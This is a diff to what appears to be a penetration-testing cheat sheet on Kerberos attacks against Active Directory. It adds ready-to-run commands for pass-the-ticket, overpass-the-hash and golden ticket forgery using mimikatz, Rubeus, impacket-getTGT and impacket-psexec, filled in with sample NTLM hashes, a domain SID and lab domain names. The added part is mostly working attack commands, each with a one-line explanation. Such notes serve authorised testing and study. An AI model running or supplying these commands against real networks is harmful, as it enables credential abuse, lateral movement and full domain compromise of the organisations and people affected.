@@ -1,6 +1,7 @@
 
 
 #### Pass the ticket :
+Using a stolen Kerberos ticket (TGT or service ticket) to authenticate to services without needing the user's password or hash.
 ```bash
 #using the mimikatz.exe
 kerberos::list
@@ -30,6 +31,34 @@ klist /purge #delete
 
 
 #### Over Pass the ticket (PTH + PTT) :
+You're generating a fresh TGT using the hash, then you can pass it — so it’s a hybrid of pass-the-hash and pass-the-ticket.
 ```bash
+#mimikatz:
+sekurlsa::pth /user:Administrator /domain:Marvel.local /ntlm:f56a8399599f1be040128b1dd9623c29 
+
+#using rubeus
+Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /ntlm:f56a8399599f1be040128b1dd9623c29 /nowrap
+Rubeus.exe ptt /ticket:<ticket base64 value>
+
+
+#using getTGT
+impacket-getTGT -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator
+
+export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local
+```
+
+
+#### Golden ticket attack :
+A Golden Ticket attack is a powerful post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the stolen hash of the KRBTGT account in Active Directory. This forged ticket gives the attacker unrestricted access to any resource in the domain — allowing them to impersonate any user, including domain admins, and maintain persistent control
+```bash
+#requirements
+kbrtgt:hash
+SID of kbrtgt
+Domain name 
+impersonate-user
+
+
+#mimikatz :
+kerberos::golden /User:zoro /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt
 
 ```
